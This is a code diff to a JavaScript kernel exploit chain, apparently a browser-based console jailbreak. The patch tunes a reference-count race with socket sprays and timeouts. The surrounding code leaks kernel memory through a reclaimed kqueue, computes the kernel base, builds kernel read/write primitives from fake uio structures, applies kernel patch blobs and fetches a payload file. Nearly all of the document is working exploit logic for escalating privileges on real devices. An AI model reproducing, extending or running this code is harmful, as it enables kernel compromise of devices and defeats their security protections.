@@ -1,4 +1,4 @@
-// chain_poops_v8.js — aiofix.bin + retry con bailout + multi-offset fdt-ofiles
+// chain_poops_v9.js — fix race cr_refcnt con sockets grandes + timeout + drain
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
@@ -87,7 +87,7 @@ function check(name, ok, detail) {
     try {
         if (window.__TM) {
             window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
-            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v8.js', line: 0, col: 0, stack: '' });
+            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v9.js', line: 0, col: 0, stack: '' });
             if (window.__TM.render) window.__TM.render();
         }
     } catch (e) { }
@@ -182,7 +182,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
 
         tmDiag('fw_key', key);
 
-        // ============ CARGAR aiofix (aiofix.bin) Y payload ============
         let kpatch = null, aiofix = null, payload = null;
         const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
             : key ? "patches/" + key.replace(".", "") + ".bin" : null;
@@ -203,7 +202,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         }
         mark("KPATCH-BLOB", kpatch ? "bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "MISSING");
 
-        // *** FIX v8: fetch aiofix.bin (nombre correcto) ***
         try {
             const r = await fetch("aiofix.bin?t=" + Date.now());
             if (r.ok) aiofix = new Uint8Array(await r.arrayBuffer());
@@ -460,10 +458,34 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
         const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
 
+        // *** FIX v9: fcntl en AMBOS socketpairs (por si funciona), setsockopt grandes (siempre funciona), preload ***
         const uioNbioRc0 = sc(SYS.fcntl, uioSs[0], F_SETFL, O_NONBLOCK).i32;
         const uioNbioRc1 = sc(SYS.fcntl, uioSs[1], F_SETFL, O_NONBLOCK).i32;
+        const iovNbioRc0 = sc(SYS.fcntl, iovSs[0], F_SETFL, O_NONBLOCK).i32;
+        const iovNbioRc1 = sc(SYS.fcntl, iovSs[1], F_SETFL, O_NONBLOCK).i32;
+
+        // Buffers grandes (independiente del fcntl)
+        lenDv.setUint32(0, 0x10000, true);
+        const uioSnd = sc(SYS.setsockopt, uioSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4).i32;
+        const uioRcv = sc(SYS.setsockopt, uioSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4).i32;
+        const iovSnd = sc(SYS.setsockopt, iovSs[1], SOL_SOCKET, SO_SNDBUF, lenAddr, 4).i32;
+        const iovRcv = sc(SYS.setsockopt, iovSs[0], SOL_SOCKET, SO_RCVBUF, lenAddr, 4).i32;
+
+        // Preload con datos para que recvmsg tenga qué leer
+        for (let i = 0; i < 4; ++i) {
+            sc(SYS.write, iovSs[1], scratch, 0x100);
+            sc(SYS.write, uioSs[1], scratch, 0x100);
+        }
+        // Drenar una parte para que el buffer no esté 100% lleno
+        sc(SYS.read, iovSs[0], scratch, 0x100);
+        sc(SYS.read, uioSs[0], scratch, 0x100);
+
         mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(",")
-            + " O_NONBLOCK rc=" + uioNbioRc0 + "," + uioNbioRc1);
+            + " fcntl uio=" + uioNbioRc0 + "," + uioNbioRc1
+            + " fcntl iov=" + iovNbioRc0 + "," + iovNbioRc1
+            + " bufs(uio s/r)=" + uioSnd + "/" + uioRcv
+            + " bufs(iov s/r)=" + iovSnd + "/" + iovRcv
+            + " preloaded");
 
         if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
         const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
@@ -773,22 +795,64 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 }
                 const tasks = new Array(iovWorkers.length);
                 let parkedSeen = -1;
+
+                // *** FIX v9: race con timeout + drain para evitar deadlock ***
                 for (let i = 0; i < NUM_IOV_SPRAY && !reclaimed; ++i) {
                     rounds = i + 1;
                     for (let k = 0; k < iovWorkers.length; ++k) tasks[k] = fireTracked(iovWorkers[k]);
                     sc(SYS.sched_yield);
-                    if (parkedSeen < 0) { await new Promise(r => setTimeout(r, 0)); parkedSeen = tasks.filter(t => !t.settled).length; mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length); }
-                    if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0 && leakDv.getInt32(0, true) === 1) { reclaimed = true; break; }
-                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
-                    await Promise.all(tasks);
-                    for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
+
+                    // Dar tiempo a los workers a parkearse
+                    await new Promise(r => setTimeout(r, 5));
+
+                    if (parkedSeen < 0) {
+                        parkedSeen = tasks.filter(t => !t.settled).length;
+                        mark("IOV-PARKED", parkedSeen + "/" + iovWorkers.length);
+                    }
+
+                    if (getRthdr(twins.a, IP6_RTHDR0_SIZE, 8) >= 0 && leakDv.getInt32(0, true) === 1) {
+                        reclaimed = true;
+                        break;
+                    }
+
+                    // Wake con write al otro extremo
+                    for (let k = 0; k < iovWorkers.length; ++k)
+                        sc(SYS.write, iovSs[1], scratch, 1);
+
+                    // Esperar workers con timeout de 500ms
+                    try {
+                        await Promise.race([
+                            Promise.all(tasks),
+                            new Promise((_, rej) => setTimeout(() => rej(new Error("race-timeout")), 500))
+                        ]);
+                    } catch (raceErr) {
+                        mark("RACE-TIMEOUT", "round=" + rounds + " " + raceErr.message);
+                        // Drenar bytes que quedaron
+                        for (let k = 0; k < iovWorkers.length; ++k) {
+                            try { sc(SYS.read, iovSs[0], scratch, 1); } catch (_) { }
+                        }
+                    }
+
+                    // Drenar lo que quede
+                    for (let k = 0; k < iovWorkers.length; ++k) {
+                        try { sc(SYS.read, iovSs[0], scratch, 1); } catch (_) { }
+                    }
+
+                    // Yield cada 32 rounds
+                    if ((i & 0x1f) === 0x1f) await new Promise(r => setTimeout(r, 0));
                 }
+
                 const rets = tasks.map(function (t, k) { return iovWorkers[k].ctx.frameDv.getInt32(0, true); });
                 mark("IOV-RETS", "rounds=" + rounds + " recvmsg_rv=" + rets.join(","));
                 check("cr_refcnt-driven-1", reclaimed, "rounds=" + rounds + " parked=" + parkedSeen + "/" + iovWorkers.length);
                 if (!reclaimed) {
                     for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
-                    await Promise.all(tasks);
+                    try {
+                        await Promise.race([
+                            Promise.all(tasks),
+                            new Promise((_, rej) => setTimeout(() => rej(new Error("drain-timeout")), 500))
+                        ]);
+                    } catch (_) { }
                     for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
                     burn(twins.a, "refcount-drive"); burn(twins.b, "refcount-drive");
                     twins = null;
@@ -808,7 +872,12 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 const t1 = findTriplet(t0, -1, "T1", MAX_ROUNDS_TRIPLET);
 
                 for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
-                await Promise.all(tasks);
+                try {
+                    await Promise.race([
+                        Promise.all(tasks),
+                        new Promise((_, rej) => setTimeout(() => rej(new Error("release-timeout")), 500))
+                    ]);
+                } catch (_) { }
                 for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
                 const rets2 = tasks.map(function (t, k) { return iovWorkers[k].ctx.frameDv.getInt32(0, true); });
                 const irOk = getRthdr(t0, IP6_RTHDR0_SIZE, 8) >= 0;
@@ -839,7 +908,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         // make_karw
         // ============================================================
         let kernelBase = null, kqFdp = null, kqFd = -1;
-        let kqLeakDump = null;   // *** v8: guardar copia del kqueue para leer offsets ***
+        let kqLeakDump = null;
         let kv = null;
         if (CFG_DO_MAKE_KARW === 1) {
             if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
@@ -863,7 +932,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) {
                         kqFd = held.pop();
                         leaked = true;
-                        // *** v8: copiar el kqueue ANTES de cerrar el fd ***
                         kqLeakDump = new Uint8Array(0xa0);
                         for (let j = 0; j < 0xa0; ++j) kqLeakDump[j] = leakU8[j];
                         break;
@@ -876,7 +944,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 check("kqueue-reclaimed-freed-chunk", leaked, "tries=" + tries + " magic_no_fdp=" + magicNoFdp + " short_reads=" + shortRead + (leaked ? " fd=" + kqFd : ""));
 
                 if (leaked && kqLeakDump) {
-                    // Leer offsets directamente del dump, no del leakDv (que puede cambiar)
                     const rd32 = (o) => kqLeakDump[o] | (kqLeakDump[o+1] << 8) | (kqLeakDump[o+2] << 16) | (kqLeakDump[o+3] << 24);
                     const rd64 = (o) => new int64(rd32(o) >>> 0, rd32(o+4) >>> 0);
 
@@ -886,7 +953,6 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                     mark("KERNEL-BASE", kernelBase + " = kl_lock-0x" + off.k_kl_lock.toString(16));
 
-                    // *** v8: probar todos los offsets candidatos para el kq_fdp ***
                     mark("KQUEUE-OFFSCAN", "probing offset candidates for kq_fdp");
                     const candidates = [];
                     for (const probeOff of [0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8, 0xb0, 0xb8, 0xc0]) {
@@ -905,13 +971,11 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets=" + triplets.join(","));
                     check("triplets2-re-found-after-kqueue-leak", !!triplets[2], triplets.join(","));
 
-                    // Guardar los candidatos para el bloque de FDT-OFILES
                     kqLeakDump.kqCandidates = candidates;
                 }
             }
         }
 
-        // Utilidades kread/kwrite
         function fakeUio(uioIov, resid, rw) {
             new Uint8Array(iovAb).fill(0);
             put(iovDv, 0x00, uioIov);
@@ -973,7 +1037,12 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         }
         async function releaseIov(itasks) {
             for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.write, iovSs[1], scratch, 1);
-            await Promise.all(itasks);
+            try {
+                await Promise.race([
+                    Promise.all(itasks),
+                    new Promise((_, rej) => setTimeout(() => rej(new Error("release-timeout")), 500))
+                ]);
+            } catch (_) { }
             for (let k = 0; k < iovWorkers.length; ++k) sc(SYS.read, iovSs[0], scratch, 1);
         }
         function tripletsAgree(why) {
@@ -1102,19 +1171,15 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             const R3_ON = params.get("r3") !== "0";
             const R4_ON = params.get("r4") !== "0";
 
-            // *** FIX v8: probar TODOS los candidatos de offset, con bailout después de 2 fallos ***
             let fdtOfiles = null;
             let fdtUsedOff = -1;
 
             if (kqLeakDump && kqLeakDump.kqCandidates && kqLeakDump.kqCandidates.length) {
-                mark("FDT-TRYING-CANDIDATES", kqLeakDump.kqCandidates.length + " candidates from kq offset scan");
+                mark("FDT-TRYING-CANDIDATES", kqLeakDump.kqCandidates.length + " candidates");
                 let consecutiveFails = 0;
                 for (const cand of kqLeakDump.kqCandidates) {
                     if (kreadPoisoned || !tripletsUsable()) break;
-                    if (consecutiveFails >= 2) {
-                        mark("FDT-BAILOUT", "2 consecutive fails, evito OOM");
-                        break;
-                    }
+                    if (consecutiveFails >= 2) { mark("FDT-BAILOUT", "2 fails consecutivos"); break; }
                     mark("FDT-CANDIDATE", "off=0x" + cand.off.toString(16) + " ptr=" + cand.ptr);
                     const v = await kread8(cand.ptr);
                     if (v && kaddrOk(v)) {
@@ -1128,12 +1193,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     }
                 }
             } else {
-                mark("FDT-NO-CANDIDATES", "fallback a kqFdp@0x98");
+                mark("FDT-NO-CANDIDATES", "fallback kqFdp@0x98");
                 const v = await kread8(kqFdp);
-                if (v && kaddrOk(v)) {
-                    fdtOfiles = v;
-                    fdtUsedOff = 0x98;
-                }
+                if (v && kaddrOk(v)) { fdtOfiles = v; fdtUsedOff = 0x98; }
             }
 
             mark("FDT-OFILES", "" + (fdtOfiles || "FAILED") + (fdtUsedOff >= 0 ? " via off 0x" + fdtUsedOff.toString(16) : ""));
@@ -1361,7 +1423,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                             }
                         } catch (kpe) { mark("KPATCH-THREW", kpe.message || String(kpe)); }
 
-                        // PAYLOAD en dos etapas
+                        // PAYLOAD
                         let payloadRunning = false;
                         let aiofixRan = false;
 
